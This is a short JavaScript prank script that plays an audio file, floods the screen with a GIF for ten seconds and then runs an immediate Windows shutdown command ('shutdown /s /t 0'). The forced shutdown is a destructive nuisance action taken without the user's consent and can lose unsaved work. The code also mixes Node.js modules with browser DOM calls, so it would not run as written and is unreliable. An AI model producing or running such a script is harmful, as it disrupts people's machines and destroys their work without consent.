const { exec } = require('child_process');
const player = require('play-sound')(opts = {});

function playMp3AndSpamGif() {
    player.play('path/to/your/audio.mp3', (err) => {
        if (err) throw err;
    });

    const gifUrl = 'download.gif';
    const spamInterval = setInterval(() => {
        const img = document.createElement('img');
        img.src = gifUrl;
        img.style.position = 'absolute';
        img.style.top = Math.random() * window.innerHeight + 'px';
        img.style.left = Math.random() * window.innerWidth + 'px';
        document.body.appendChild(img);
    }, 100);

    setTimeout(() => {
        clearInterval(spamInterval);
        shutdownComputer();
    }, 10000); // Spams for 10 seconds
}

function shutdownComputer() {
    exec('shutdown /s /t 0', (err) => {
        if (err) throw err;
    });
}

playMp3AndSpamGif();
